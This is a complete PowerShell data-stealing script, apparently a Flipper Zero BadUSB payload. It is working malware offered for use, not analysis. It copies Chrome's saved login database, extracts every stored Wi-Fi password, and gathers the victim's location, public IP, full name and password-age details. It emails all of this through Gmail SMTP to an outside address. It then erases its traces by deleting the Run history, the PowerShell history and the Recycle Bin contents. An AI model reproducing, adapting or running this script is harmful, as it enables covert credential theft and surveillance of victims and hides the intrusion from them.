<# Editable paramaters #>
$SMTPServer = 'smtp.gmail.com'
$emailSmtpUser = "FlipperZero.Sender@gmail.com"
$emailTo = "flipperzero.receiver@gmail.com"
<# End of editable paramaters #>

<# Running code - do not edit the below #>
$emailSmtpPass = $args[0]
$useDebugFiles = $args[1]
$tempFolder = "$env:TEMP\GrabberOutput"

# Allow using a debug output location for testing
if ($useDebugFiles -eq "true") {
	$baseFolder = "C:\Users\$env:UserName\Desktop\TestOutput"
} else {
	$baseFolder = $tempFolder
}

# Ensure we have a clean folder to work with
if (Test-Path -Path $baseFolder) {
	Get-ChildItem -Path $baseFolder -Include * -File -Recurse | foreach { $_.Delete()}
} else {
	New-Item -ItemType "directory" -Path "$baseFolder"
}


<# Grabbing the various data #>
$generalDetailsFilePath = "$baseFolder\GeneralDetails.txt"

# Copy chrome data into a local file
$chromeDataFilePath = "$baseFolder\Chrome_Data.txt"
Copy-Item "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" $chromeDataFilePath

# Grab the available Wifi details
$wifiFilePath = "$baseFolder\Wifi.txt"

function Grab-Wifi-Details {
	# Get Network Interfaces
	$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

	# Get Wifi SSIDs and Passwords	
	$WLANProfileNames =@()

	#Get all the WLAN profile names
	$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

	#Trim the output to receive only the name
	Foreach($WLANProfileName in $Output){
		$WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
	}
	$WLANProfileObjects =@()

	#Bind the WLAN profile names and also the password to a custom object
	Foreach($WLANProfileName in $WLANProfileNames){
		#get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
		try{
			$WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
		}Catch{
			$WLANProfilePassword = "The password is not stored in this profile"
		}

		#Build the object and add this to an array
		$WLANProfileObject = New-Object PSCustomobject 
		$WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
		$WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
		$WLANProfileObjects += $WLANProfileObject
		Remove-Variable WLANProfileObject
	}

	if (!$WLANProfileObjects) { Write-Host "variable is null" 
	}else { 
		echo "`nW-Lan profiles: ===============================" $WLANProfileObjects >> $wifiFilePath
		$content = [IO.File]::ReadAllText($wifiFilePath)
	}
}
Grab-Wifi-Details


function Get-GeoLocation{
	try {
		Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
		$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
		$GeoWatcher.Start() #Begin resolving current locaton

		while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
			Start-Sleep -Milliseconds 100 #Wait for discovery.
		}  

		if ($GeoWatcher.Permission -eq 'Denied'){
			Write-Error 'Access Denied for Location Information'
		} else {
			$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
			
		}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
		return "No Coordinates found"
		-ErrorAction SilentlyContinue
    } 
}

$GL = Get-GeoLocation
if ($GL) { echo "`nYour Location: `n$GL" >> $generalDetailsFilePath }


function Get-Public-IP {
    try {
		$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    }

    # Write Error is just for troubleshooting 
    catch {Write-Error "No Public IP was detected" 
		return $null
		-ErrorAction SilentlyContinue
    }

    return $computerPubIP
}

$publicIP = Get-Public-IP
if ($publicIP) { echo "`nPublic IP: $publicIP" >> $generalDetailsFilePath }
else { echo "`nUnable to obtain public IP" >> $generalDetailsFilePath } 

function Get-Days_Set {
    try {
		$pls = net user $env:USERNAME | Select-String -Pattern "Password last" ; $pls = [string]$pls
		$plsPOS = $pls.IndexOf("e")
		$pls = $pls.Substring($plsPOS+2).Trim()
		$pls = $pls -replace ".{3}$"
		$time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
		$DateArray =$time.Split(".")
		$days = [int]$DateArray[0]
		return $pls
    }
 
	# If no password set date is detected funtion will return $null to cancel Sapi Speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Day password set not found" 
		return $null
		-ErrorAction SilentlyContinue
    }
}

$pls = Get-Days_Set
if ($pls) { echo "`nPassword Last Set: $pls" >> $generalDetailsFilePath }




<# !!!!!!!!!! Send the email !!!!!!!!! #>
function Get-Name {
    try {
		$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
    }
 
    # Write Error is just for troubleshooting 
    catch {
		Write-Error "No name was detected" 
		return $env:UserName
		-ErrorAction SilentlyContinue
    }

    return $fullName
}
$fullName = Get-Name

# Send the email with attachements
$sstr = ConvertTo-SecureString -string $emailSmtpPass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -argumentlist $emailSmtpUser, $sstr
$subject = "$fullName ($env:UserName)"

Send-MailMessage -From $emailSmtpUser -To $emailTo -Subject $subject -Body "Data test" -Attachments $chromeDataFilePath, $wifiFilePath, $generalDetailsFilePath -SmtpServer $SMTPServer -UseSSL -Credential $cred -Port 587



<# !!!!!!! Clean up after self !!!!!!!!!! #>
# Delete contents of Temp folder (intentionally not using baseFolder so we can debug as needed)
rm $tempFolder\* -r -Force -ErrorAction SilentlyContinue
if (Test-Path -Path $tempFolder) {
	Remove-Item $tempFolder
}

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Delete contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue